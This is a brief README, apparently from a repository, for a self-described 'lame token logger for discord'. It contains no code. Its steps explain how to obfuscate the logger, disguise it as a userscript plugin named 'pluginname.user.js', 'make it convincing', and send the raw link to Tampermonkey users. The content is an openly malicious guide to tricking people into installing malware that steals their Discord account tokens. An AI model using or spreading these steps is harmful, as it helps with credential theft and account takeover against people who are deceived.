# token-logger
a really lame token logger for discord lol

# how does it work / how can i use it
1. after changing the code to how you want it, obfuscate it using [this website](https://obfuscator.io)
2. copy the code you got, then make a github repo called `pluginname.user.js`
3. **make it convincing!**
4. copy the raw file link, and send it to someone with tampermonkey lol
